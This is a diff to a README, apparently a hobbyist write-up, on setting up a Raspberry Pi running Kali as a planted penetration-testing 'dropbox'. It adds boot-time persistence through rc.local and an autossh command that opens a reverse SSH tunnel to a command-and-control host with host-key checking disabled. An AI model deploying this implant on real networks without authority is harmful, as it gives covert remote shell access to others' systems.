@@ -23,9 +23,37 @@ For this to work
 I already have Kali Linux for arm installed on my raspberry pi 4 but this is not enough for using it as a dropbox.
 To set this up you want it to be able to be dropped somewhere easy and fast and connect to it remotely after dropping it.
 
+To get the dropbox to work I needed that kali to automatically login because if we don't do that the pi won't connect to the internet.
+I have created keys and coppied them to all the needed devices to have a secure connection with key authentication.
 
 
 ### Autossh
+auto ssh needs to be installed this makes a connection with a ssh server and keeps monitoring it for reconnection.
+I use keys for authentication these keys I coppied before.
+To make autossh work it needs to be running at bootup.
+I used rc-local to run it on bootup by using this code in /etc/systemd/system/rc-local.service
+
+```
+[Unit]
+ Description=/etc/rc.local Compatibility
+ ConditionPathExists=/etc/rc.local
+[Service]
+ Type=forking
+ ExecStart=/etc/rc.local start
+ TimeoutSec=0
+ StandardOutput=tty
+ RemainAfterExit=yes
+ SysVStartPriority=99
+[Install]
+ WantedBy=multi-user.target
+```
+
+I also added the next code to /etc/rc.local
+```
+#!/bin/bash -e
+autossh -M $mp -fN -o "PubkeyAuthentication=yes" -o "StrictHostKeyChecking=false" -o "PasswordAuthentication=no" -o "ServerAliveInterval 60" -o "ServerAliveCountMax 3" -R $FUID:localhost:22 -i /root/.ssh/id_rsa $cncuser@$cncip &
+exit 0
+```
 
 ## Improvements
 I have attached a wireless USB adapter to have more range and wifi hacking possibilities.
